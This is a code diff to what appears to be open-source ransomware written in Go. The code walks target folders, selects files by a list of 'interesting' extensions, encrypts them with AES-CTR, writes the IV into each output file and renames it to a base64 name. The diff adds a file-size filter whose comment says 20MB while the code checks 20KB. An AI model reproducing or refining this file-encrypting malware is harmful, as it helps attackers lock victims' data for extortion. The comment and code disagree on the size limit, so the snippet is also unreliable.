@@ -121,7 +121,9 @@ func encryptFiles() {
 			folder := cmd.BaseDir + f
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
 				ext := filepath.Ext(path)
-				if ext != "" {
+
+				// If the file is not a folder and have a size lower than 20MB
+				if ext != "" && f.Size() < (20*1024) {
 					// Matching extensions
 					if utils.StringInSlice(strings.ToLower(ext[1:]), cmd.InterestingExtensions) {
 						// Each file is processed by a free worker on the pool
@@ -213,7 +215,7 @@ func encryptFile(file cmd.File, enckey string) {
 		return
 	}
 
-	// Get a stream for encrypt/decrypt in counter mode
+	// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
 	stream := cipher.NewCTR(block, iv)
 
 	// Replace the file name by the base64 equivalent
@@ -227,7 +229,7 @@ func encryptFile(file cmd.File, enckey string) {
 	}
 	defer outFile.Close()
 
-	// Write the Initialization Vector (iv) as the first bytes
+	// Write the Initialization Vector (iv) as the first bytes block
 	// of the encrypted file
 	outFile.Write(iv)
 
